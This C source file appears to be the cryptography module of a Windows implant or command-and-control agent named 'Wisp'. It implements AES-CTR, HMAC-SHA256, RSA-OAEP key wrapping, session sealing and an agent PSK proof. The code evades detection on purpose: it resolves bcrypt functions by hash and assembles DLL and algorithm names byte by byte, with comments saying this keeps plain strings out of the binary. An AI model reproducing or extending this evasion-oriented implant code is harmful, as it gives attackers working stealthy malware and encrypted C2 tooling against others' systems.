#include "WispCrypto.h"
#include "WispDefines.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "utils.h"
#include "Encoders.h"

#if defined(DEBUG)
static void wisp_wclog(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define WLOGCRYPT(...) do { char __lb[512]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); wisp_wclog(__lb); } } while (0)
#else
#define WLOGCRYPT(...) do { } while (0)
#endif

//////// lazy bcrypt resolution ////////

static BOOL g_bcryptTried = FALSE;
static BOOL g_bcryptOk = FALSE;

// function pointers declared extern in WispCrypto.h:
//   wBCryptOpenAlgorithmProvider, wBCryptGenerateSymmetricKey, ...
#define WISP_DEFINE_API(x) decltype(x)* w##x = NULL
WISP_DEFINE_API(BCryptOpenAlgorithmProvider);
WISP_DEFINE_API(BCryptCloseAlgorithmProvider);
WISP_DEFINE_API(BCryptGenerateSymmetricKey);
WISP_DEFINE_API(BCryptDestroyKey);
WISP_DEFINE_API(BCryptEncrypt);
WISP_DEFINE_API(BCryptDecrypt);
WISP_DEFINE_API(BCryptCreateHash);
WISP_DEFINE_API(BCryptDestroyHash);
WISP_DEFINE_API(BCryptHashData);
WISP_DEFINE_API(BCryptFinishHash);
WISP_DEFINE_API(BCryptGenRandom);
WISP_DEFINE_API(BCryptSetProperty);
WISP_DEFINE_API(BCryptImportKeyPair);
WISP_DEFINE_API(BCryptVerifySignature);
WISP_DEFINE_API(BCryptGetProperty);
#undef WISP_DEFINE_API

// bcrypt.dll name built char-by-char (no plain literal in .rdata).
static HMODULE WispLoadBcrypt()
{
	CHAR name[12];
	name[0] = 'b'; name[1] = 'c'; name[2] = 'r'; name[3] = 'y'; name[4] = 'p';
	name[5] = 't'; name[6] = '.'; name[7] = 'd'; name[8] = 'l'; name[9] = 'l'; name[10] = 0;
	return ApiWin->LoadLibraryA(name);
}

BOOL WispBcryptLoad()
{
	if (g_bcryptTried)
		return g_bcryptOk;
	g_bcryptTried = TRUE;

	HMODULE h = WispLoadBcrypt();
	if (!h)
		return FALSE;

	wBCryptOpenAlgorithmProvider  = (decltype(BCryptOpenAlgorithmProvider)*) GetSymbolAddress(h, 0x2f92963c);
	wBCryptCloseAlgorithmProvider = (decltype(BCryptCloseAlgorithmProvider)*)GetSymbolAddress(h, 0x4308c800);
	wBCryptGenerateSymmetricKey   = (decltype(BCryptGenerateSymmetricKey)*) GetSymbolAddress(h, 0xf61d0da9);
	wBCryptDestroyKey             = (decltype(BCryptDestroyKey)*)           GetSymbolAddress(h, 0xf020386b);
	wBCryptEncrypt                = (decltype(BCryptEncrypt)*)              GetSymbolAddress(h, 0xddff527d);
	wBCryptDecrypt                = (decltype(BCryptDecrypt)*)              GetSymbolAddress(h, 0x7c06a813);
	wBCryptCreateHash             = (decltype(BCryptCreateHash)*)           GetSymbolAddress(h, 0x38271eb0);
	wBCryptDestroyHash            = (decltype(BCryptDestroyHash)*)          GetSymbolAddress(h, 0xf4258f46);
	wBCryptHashData               = (decltype(BCryptHashData)*)             GetSymbolAddress(h, 0x9e8bdc96);
	wBCryptFinishHash             = (decltype(BCryptFinishHash)*)           GetSymbolAddress(h, 0xdfea5bdd);
	wBCryptGenRandom              = (decltype(BCryptGenRandom)*)            GetSymbolAddress(h, 0x42d34df3);
	wBCryptSetProperty            = (decltype(BCryptSetProperty)*)          GetSymbolAddress(h, 0x87651269);
	wBCryptImportKeyPair          = (decltype(BCryptImportKeyPair)*)        GetSymbolAddress(h, 0x663c9108);
	wBCryptVerifySignature        = (decltype(BCryptVerifySignature)*)      GetSymbolAddress(h, 0x8bd85adf);
	wBCryptGetProperty            = (decltype(BCryptGetProperty)*)            GetSymbolAddress(h, 0x470c935d);

	g_bcryptOk = wBCryptOpenAlgorithmProvider && wBCryptCloseAlgorithmProvider &&
		wBCryptGenerateSymmetricKey && wBCryptDestroyKey && wBCryptEncrypt && wBCryptDecrypt &&
		wBCryptCreateHash && wBCryptDestroyHash && wBCryptHashData && wBCryptFinishHash &&
		wBCryptGenRandom && wBCryptSetProperty && wBCryptImportKeyPair && wBCryptGetProperty;
	return g_bcryptOk;
}

//////// runtime-wide strings ////////

// Algorithm names assembled at runtime to keep .rdata clean.
static BOOL WispAlgOpen(BYTE* wideName, BCRYPT_ALG_HANDLE* out)
{
	return NT_SUCCESS(wBCryptOpenAlgorithmProvider(out, (LPCWSTR)wideName, NULL, 0));
}

static BOOL WispAlgAes(BYTE* nameBuf)   // "AES" -> 8 bytes
{
	nameBuf[0] = 'A'; nameBuf[1] = 0; nameBuf[2] = 'E'; nameBuf[3] = 0;
	nameBuf[4] = 'S'; nameBuf[5] = 0; nameBuf[6] = 0; nameBuf[7] = 0;
	return TRUE;
}

static BOOL WispAlgSha(BYTE* nameBuf)   // "SHA256" -> 14 bytes
{
	const char* s = "SHA256";
	for (int i = 0; i < 6; i++) {
		nameBuf[i * 2] = (BYTE)s[i];
		nameBuf[i * 2 + 1] = 0;
	}
	nameBuf[12] = 0; nameBuf[13] = 0;
	return TRUE;
}

static BOOL WispAlgRsa(BYTE* nameBuf)   // "RSA" -> 8 bytes
{
	nameBuf[0] = 'R'; nameBuf[1] = 0; nameBuf[2] = 'S'; nameBuf[3] = 0;
	nameBuf[4] = 'A'; nameBuf[5] = 0; nameBuf[6] = 0; nameBuf[7] = 0;
	return TRUE;
}

static BOOL WispPropChaining(BYTE* nameBuf) // "ChainingMode"
{
	const char* s = "ChainingMode";
	for (int i = 0; i < 12; i++) {
		nameBuf[i * 2] = (BYTE)s[i];
		nameBuf[i * 2 + 1] = 0;
	}
	nameBuf[24] = 0; nameBuf[25] = 0;
	return TRUE;
}

BOOL WispSha256(const BYTE* data, ULONG dataLen, BYTE* out)
{
	if (!WispBcryptLoad())
		return FALSE;
	BYTE an[14];
	WispAlgSha(an);
	BCRYPT_ALG_HANDLE alg = NULL;
	if (!WispAlgOpen(an, &alg))
		return FALSE;
	BOOL ok = FALSE;
	BCRYPT_HASH_HANDLE hh = NULL;
	if (NT_SUCCESS(wBCryptCreateHash(alg, &hh, NULL, 0, NULL, 0, 0))) {
		if (NT_SUCCESS(wBCryptHashData(hh, (PUCHAR)data, dataLen, 0)))
			ok = NT_SUCCESS(wBCryptFinishHash(hh, out, 32, 0));
		wBCryptDestroyHash(hh);
	}
	wBCryptCloseAlgorithmProvider(alg, 0);
	return ok;
}

BOOL WispSha256Begin(WispSha256Ctx* c)
{
	BYTE an[14];
	ULONG objLen = 0, res = 0;
	if (!c)
		return FALSE;
	memset(c, 0, sizeof(*c));
	if (!WispBcryptLoad())
		return FALSE;
	WispAlgSha(an);
	if (!WispAlgOpen(an, &c->alg))
		return FALSE;
	if (!NT_SUCCESS(wBCryptGetProperty(c->alg, L"ObjectLength", (PUCHAR)&objLen, sizeof(objLen), &res, 0)) || objLen == 0) {
		wBCryptCloseAlgorithmProvider(c->alg, 0);
		c->alg = NULL;
		return FALSE;
	}
	c->obj = (PUCHAR)MemAllocLocal(objLen);
	if (!c->obj) {
		wBCryptCloseAlgorithmProvider(c->alg, 0);
		c->alg = NULL;
		return FALSE;
	}
	c->objLen = objLen;
	if (!NT_SUCCESS(wBCryptCreateHash(c->alg, &c->hash, c->obj, objLen, NULL, 0, 0))) {
		MemFreeLocal((LPVOID*)&c->obj, objLen);
		wBCryptCloseAlgorithmProvider(c->alg, 0);
		c->alg = NULL;
		return FALSE;
	}
	return TRUE;
}

BOOL WispSha256Update(WispSha256Ctx* c, const BYTE* data, ULONG len)
{
	if (!c || !c->hash)
		return FALSE;
	return NT_SUCCESS(wBCryptHashData(c->hash, (PUCHAR)data, len, 0));
}

BOOL WispSha256End(WispSha256Ctx* c, BYTE* out32)
{
	BOOL ok = FALSE;
	if (!c)
		return FALSE;
	if (c->hash) {
		ok = NT_SUCCESS(wBCryptFinishHash(c->hash, out32, 32, 0));
		wBCryptDestroyHash(c->hash);
		c->hash = NULL;
	}
	if (c->obj) {
		MemFreeLocal((LPVOID*)&c->obj, c->objLen);
		c->obj = NULL;
	}
	if (c->alg) {
		wBCryptCloseAlgorithmProvider(c->alg, 0);
		c->alg = NULL;
	}
	return ok;
}

BOOL WispHmacSha256(const BYTE* key, ULONG keyLen, const BYTE* data, ULONG dataLen, BYTE* out)
{
	if (!WispBcryptLoad())
		return FALSE;

	// RFC 2104 HMAC over SHA-256 (block size 64), built from the plain hash:
	// robust regardless of CNG HMAC property availability.
	BYTE k[64];
	memset(k, 0, sizeof(k));
	if (keyLen > 64) {
		if (!WispSha256(key, keyLen, k))
			return FALSE;
	}
	else {
		memcpy(k, key, keyLen);
	}
	BYTE ip[64], op[64], inner[32];
	for (int i = 0; i < 64; i++) {
		ip[i] = k[i] ^ 0x36;
		op[i] = k[i] ^ 0x5c;
	}
	BOOL ok = FALSE;
	// inner = SHA256(ip || data)
	BYTE an2[14];
	WispAlgSha(an2);
	BCRYPT_ALG_HANDLE a2 = NULL;
	if (!WispAlgOpen(an2, &a2))
		return FALSE;
	BCRYPT_HASH_HANDLE hh = NULL;
	if (!NT_SUCCESS(wBCryptCreateHash(a2, &hh, NULL, 0, NULL, 0, 0))) {
		wBCryptCloseAlgorithmProvider(a2, 0);
		return FALSE;
	}
	ok = NT_SUCCESS(wBCryptHashData(hh, ip, 64, 0)) &&
		NT_SUCCESS(wBCryptHashData(hh, (PUCHAR)data, dataLen, 0)) &&
		NT_SUCCESS(wBCryptFinishHash(hh, inner, 32, 0));
	wBCryptDestroyHash(hh);
	if (!ok) {
		wBCryptCloseAlgorithmProvider(a2, 0);
		return FALSE;
	}
	// outer = SHA256(op || inner)
	if (!NT_SUCCESS(wBCryptCreateHash(a2, &hh, NULL, 0, NULL, 0, 0))) {
		wBCryptCloseAlgorithmProvider(a2, 0);
		return FALSE;
	}
	ok = NT_SUCCESS(wBCryptHashData(hh, op, 64, 0)) &&
		NT_SUCCESS(wBCryptHashData(hh, inner, 32, 0)) &&
		NT_SUCCESS(wBCryptFinishHash(hh, out, 32, 0));
	wBCryptDestroyHash(hh);
	wBCryptCloseAlgorithmProvider(a2, 0);
	return ok;
}

BOOL WispRandom(BYTE* out, ULONG len)
{
	if (!WispBcryptLoad())
		return FALSE;
	// NULL handle + BCRYPT_USE_SYSTEM_PREFERRED_RNG = system PRNG
	return NT_SUCCESS(wBCryptGenRandom(NULL, out, len, 0x00000002));
}

// AES-256-CTR via CNG: CNG lacks direct CTR support, so build the keystream
// by ECB-encrypting successive counter blocks (standard construction).
BOOL WispAesCtrXor(const BYTE* key32, const BYTE* iv16, const BYTE* in, ULONG len, BYTE* out)
{
	if (!WispBcryptLoad())
		return FALSE;
	BYTE an[8], pn[26];
	WispAlgAes(an);
	WispPropChaining(pn);
	BCRYPT_ALG_HANDLE alg = NULL;
	if (!WispAlgOpen(an, &alg))
		return FALSE;
	// ECB on counter blocks emulates CTR (CNG has no native CTR).
	BYTE ecb[32];
	const char* e = "ChainingModeECB";
	for (int i = 0; i < 15; i++) {
		ecb[i * 2] = (BYTE)e[i];
		ecb[i * 2 + 1] = 0;
	}
	ecb[30] = 0; ecb[31] = 0;
	if (!NT_SUCCESS(wBCryptSetProperty(alg, (LPCWSTR)pn,
		ecb, 32, 0))) {
		wBCryptCloseAlgorithmProvider(alg, 0);
		return FALSE;
	}
	BOOL ok = FALSE;
	BCRYPT_KEY_HANDLE kh = NULL;
	if (NT_SUCCESS(wBCryptGenerateSymmetricKey(alg, &kh, NULL, 0, (PUCHAR)key32, 32, 0))) {
		BYTE ctr[16], ks[16];
		memcpy(ctr, iv16, 16);
		ULONG done = 0;
		ok = TRUE;
		while (done < len) {
			ULONG cbResult = 0;
			// ECB encrypt the counter block = raw AES block encryption
			NTSTATUS st = wBCryptEncrypt(kh, ctr, 16, NULL, NULL, 0, ks, 16, &cbResult, 0);
			if (!NT_SUCCESS(st)) {
				ok = FALSE;
				break;
			}
			ULONG chunk = len - done;
			if (chunk > 16)
				chunk = 16;
			for (ULONG i = 0; i < chunk; i++)
				out[done + i] = in[done + i] ^ ks[i];
			done += chunk;
			// big-endian increment of the whole 128-bit counter (Go CTR semantics)
			for (int i = 15; i >= 0; i--) {
				if (++ctr[i])
					break;
			}
		}
		wBCryptDestroyKey(kh);
	}
	wBCryptCloseAlgorithmProvider(alg, 0);
	return ok;
}

//////// session key sealing ////////

BOOL WispSeal(const WispSessionKey* sk, const BYTE* plain, ULONG plainLen, BYTE* out, ULONG outCap, ULONG* outLen)
{
	ULONG need = WISP_IV_SIZE + plainLen + WISP_HMAC_SIZE;
	if (!out || outCap < need)
		return FALSE;
	BYTE* iv = out;
	BYTE* ct = out + WISP_IV_SIZE;
	if (!WispRandom(iv, WISP_IV_SIZE))
		return FALSE;
	if (!WispAesCtrXor(sk->enc, iv, plain, plainLen, ct))
		return FALSE;
	if (!WispHmacSha256(sk->mac, WISP_MAC_SIZE, out, WISP_IV_SIZE + plainLen, out + WISP_IV_SIZE + plainLen))
		return FALSE;
	*outLen = need;
	return TRUE;
}

static BOOL ctEqual(const BYTE* a, const BYTE* b, ULONG n)
{
	BYTE d = 0;
	for (ULONG i = 0; i < n; i++)
		d |= a[i] ^ b[i];
	return d == 0;
}

BOOL WispOpen(const WispSessionKey* sk, const BYTE* blob, ULONG blobLen, BYTE* plain, ULONG plainCap, ULONG* plainLen)
{
	if (blobLen < WISP_IV_SIZE + WISP_HMAC_SIZE)
		return FALSE;
	ULONG body = blobLen - WISP_HMAC_SIZE;
	ULONG ctLen = body - WISP_IV_SIZE;
	if (plainCap < ctLen)
		return FALSE;
	BYTE mac[32];
	if (!WispHmacSha256(sk->mac, WISP_MAC_SIZE, blob, body, mac))
		return FALSE;
	if (!ctEqual(mac, blob + body, WISP_HMAC_SIZE))
		return FALSE;
	if (!WispAesCtrXor(sk->enc, blob, blob + WISP_IV_SIZE, ctLen, plain))
		return FALSE;
	*plainLen = ctLen;
	return TRUE;
}

BOOL WispPskProof(const char* psk, const char* agentId, const BYTE* keyId, ULONG keyIdLen, BYTE* out32)
{
	// HMAC(psk, agentID || 0x7c || hex(keyID))
	static const char* hexd = "0123456789abcdef";
	ULONG alen = StrLenA((CHAR*)agentId);
	ULONG hlen = keyIdLen * 2;
	ULONG total = alen + 1 + hlen;
	BYTE* msg = (BYTE*)MemAllocLocal(total);
	if (!msg)
		return FALSE;
	memcpy(msg, agentId, alen);
	msg[alen] = 0x7c;
	for (ULONG i = 0; i < keyIdLen; i++) {
		msg[alen + 1 + i * 2] = (BYTE)hexd[keyId[i] >> 4];
		msg[alen + 1 + i * 2 + 1] = (BYTE)hexd[keyId[i] & 0xF];
	}
	BOOL ok = WispHmacSha256((const BYTE*)psk, StrLenA((CHAR*)psk), msg, total, out32);
	MemFreeLocal((LPVOID*)&msg, total);
	return ok;
}

//////// PEM / DER / RSA ////////

BOOL WispPemToDer(const char* pem, BYTE** der, ULONG* derLen)
{
	// find "-----BEGIN PUBLIC KEY-----" ... base64 ... "-----END"
	const char* b = NULL;
	ULONG len = StrLenA((CHAR*)pem);
	const char* end = pem + len;
	const char* p = pem;
	while (p + 27 <= end) {
		if (StrNCmpA((CHAR*)p, (CHAR*)"-----BEGIN PUBLIC KEY-----", 26) == 0) {
			b = p + 26;
			break;
		}
		p++;
	}
	if (!b)
		return FALSE;
	const char* e = b;
	while (e + 24 <= end) {
		if (StrNCmpA((CHAR*)e, (CHAR*)"-----END PUBLIC KEY-----", 23) == 0)
			break;
		e++;
	}
	if (e + 24 > end)
		return FALSE;
	// strip whitespace into a tight b64 buffer
	char* b64 = (char*)MemAllocLocal((ULONG)(e - b) + 1);
	if (!b64)
		return FALSE;
	ULONG n = 0;
	for (const char* q = b; q < e; q++) {
		char c = *q;
		if (c == '\r' || c == '\n' || c == ' ' || c == '\t')
			continue;
		b64[n++] = c;
	}
	b64[n] = 0;
	ULONG cap = n / 4 * 3 + 8;
	BYTE* out = (BYTE*)MemAllocLocal(cap);
	if (!out) {
		MemFreeLocal((LPVOID*)&b64, (ULONG)(e - b) + 1);
		return FALSE;
	}
	BOOL ok = FALSE;
	if (b64_decode(b64, out, (int)cap)) {
		*der = out;
		*derLen = b64_decoded_size(b64);
		ok = TRUE;
	}
	else {
		MemFreeLocal((LPVOID*)&out, cap);
	}
	MemFreeLocal((LPVOID*)&b64, (ULONG)(e - b) + 1);
	return ok;
}

// Minimal ASN.1 DER walker for PKIX SubjectPublicKeyInfo -> RSA public key.
typedef struct {
	const BYTE* p;
	const BYTE* end;
} DerIt;

static BOOL derTag(DerIt* it, BYTE tag)
{
	if (it->p >= it->end || *it->p != tag)
		return FALSE;
	it->p++;
	return TRUE;
}

static BOOL derLen2(DerIt* it, ULONG* len)
{
	if (it->p >= it->end)
		return FALSE;
	BYTE b = *it->p++;
	if (b < 0x80) {
		*len = b;
		return TRUE;
	}
	BYTE n = b & 0x7F;
	if (n == 0 || n > 4 || it->p + n > it->end)
		return FALSE;
	ULONG v = 0;
	for (BYTE i = 0; i < n; i++)
		v = (v << 8) | *it->p++;
	*len = v;
	return TRUE;
}

static BOOL derExpect(DerIt* it, BYTE tag, const BYTE** body, ULONG* len)
{
	return derTag(it, tag) && derLen2(it, len) && it->p + *len <= it->end &&
		(body ? (*body = it->p, TRUE) : TRUE) && (it->p += *len, TRUE);
}

BOOL WispRsaOaepWrap(const BYTE* der, ULONG derLen, const BYTE* plain, ULONG plainLen, BYTE* out, ULONG outCap, ULONG* outLen)
{
	if (!WispBcryptLoad())
		return FALSE;
	// SubjectPublicKeyInfo ::= SEQUENCE { algorithm SEQUENCE {...}, BIT STRING }
	DerIt it = { der, der + derLen };
	const BYTE* spkiBody = NULL;
	ULONG spkiLen = 0;
	if (!derExpect(&it, 0x30, &spkiBody, &spkiLen))
		return FALSE;
	DerIt seq = { spkiBody, spkiBody + spkiLen };
	const BYTE* algBody = NULL;
	ULONG algLen = 0;
	if (!derExpect(&seq, 0x30, &algBody, &algLen))
		return FALSE;
	// skip the algorithm SEQUENCE content (OID rsaEncryption + NULL)
	seq.p = algBody + algLen;
	const BYTE* bits = NULL;
	ULONG bitsLen = 0;
	if (!derExpect(&seq, 0x03, &bits, &bitsLen) || bitsLen < 1)
		return FALSE;
	if (*bits != 0) // unused-bits count must be 0
		return FALSE;
	const BYTE* rsaPub = bits + 1;
	ULONG rsaPubLen = bitsLen - 1;

	// import as RSA public key blob (BCRYPT_RSAKEY_BLOB header + modulus/exp)
	DerIt rk = { rsaPub, rsaPub + rsaPubLen };
	const BYTE* seqBody = NULL;
	ULONG seqLen = 0;
	if (!derExpect(&rk, 0x30, &seqBody, &seqLen))
		return FALSE;
	DerIt rs = { seqBody, seqBody + seqLen };
	const BYTE* mod = NULL, * expo = NULL;
	ULONG modLen = 0, expoLen = 0;
	if (!derExpect(&rs, 0x02, &mod, &modLen) || !derExpect(&rs, 0x02, &expo, &expoLen))
		return FALSE;
	while (modLen > 0 && *mod == 0) { mod++; modLen--; }
	while (expoLen > 0 && *expo == 0) { expo++; expoLen--; }
	if (modLen < 256 || modLen > 1024 || expoLen == 0 || expoLen > 8)
		return FALSE;
#if defined(DEBUG)
	WLOGCRYPT("[crypto] rsa mod=%u exp=%u\n", modLen, expoLen);
#endif

	// BCRYPT_RSAKEY_BLOB (magic, bitlen, pubexp len, mod len, priv1..4 = 0)
	ULONG hdr = 24;
	ULONG blobLen = hdr + expoLen + modLen;
	BYTE* blob = (BYTE*)MemAllocLocal(blobLen);
	if (!blob)
		return FALSE;
	// magic 'RSA1' little-endian
	blob[0] = 'R'; blob[1] = 'S'; blob[2] = 'A'; blob[3] = '1';
	ULONG bitlen = modLen * 8;
	blob[4] = (BYTE)bitlen; blob[5] = (BYTE)(bitlen >> 8); blob[6] = (BYTE)(bitlen >> 16); blob[7] = (BYTE)(bitlen >> 24);
	blob[8] = (BYTE)expoLen; blob[9] = (BYTE)(expoLen >> 8); blob[10] = (BYTE)(expoLen >> 16); blob[11] = (BYTE)(expoLen >> 24);
	blob[12] = (BYTE)modLen; blob[13] = (BYTE)(modLen >> 8); blob[14] = (BYTE)(modLen >> 16); blob[15] = (BYTE)(modLen >> 24);
	memset(blob + 16, 0, 8);
	memcpy(blob + hdr, expo, expoLen);
	memcpy(blob + hdr + expoLen, mod, modLen);

	BOOL ok = FALSE;
	BYTE an[8];
	WispAlgRsa(an);
	BCRYPT_ALG_HANDLE alg = NULL;
	if (WispAlgOpen(an, &alg)) {
		BCRYPT_KEY_HANDLE kh = NULL;
		// BCRYPT_RSAPUBLIC_BLOB = L"RSAPUBLICBLOB" (assembled at runtime, no underscore)
		BYTE blobType[28];
		const char* bt = "RSAPUBLICBLOB";
		for (int i = 0; i < 13; i++) {
			blobType[i * 2] = (BYTE)bt[i];
			blobType[i * 2 + 1] = 0;
		}
		blobType[26] = 0; blobType[27] = 0;
		NTSTATUS ist = wBCryptImportKeyPair(alg, NULL, (LPCWSTR)blobType, &kh, blob, blobLen, 0);
		if (NT_SUCCESS(ist)) {
			BYTE shaW[14];
			WispAlgSha(shaW);
			BCRYPT_OAEP_PADDING_INFO pi;
			pi.pszAlgId = (LPCWSTR)shaW;
			pi.pbLabel = NULL;
			pi.cbLabel = 0;
			ULONG cb = 0;
			NTSTATUS st = wBCryptEncrypt(kh, (PUCHAR)plain, plainLen, &pi,
				NULL, 0, out, outCap, &cb, BCRYPT_PAD_OAEP);
#if defined(DEBUG)
			if (!NT_SUCCESS(st)) {
				WLOGCRYPT("[crypto] OAEP encrypt failed 0x%08x\n", st);
			}
#endif
			if (NT_SUCCESS(st)) {
				*outLen = cb;
				ok = TRUE;
			}
			wBCryptDestroyKey(kh);
		}
#if defined(DEBUG)
		else {
			WLOGCRYPT("[crypto] import key pair failed 0x%08x blobLen=%u\n", ist, blobLen);
		}
#endif
		wBCryptCloseAlgorithmProvider(alg, 0);
	}
	memset(blob, 0, blobLen);
	MemFreeLocal((LPVOID*)&blob, blobLen);
	return ok;
}
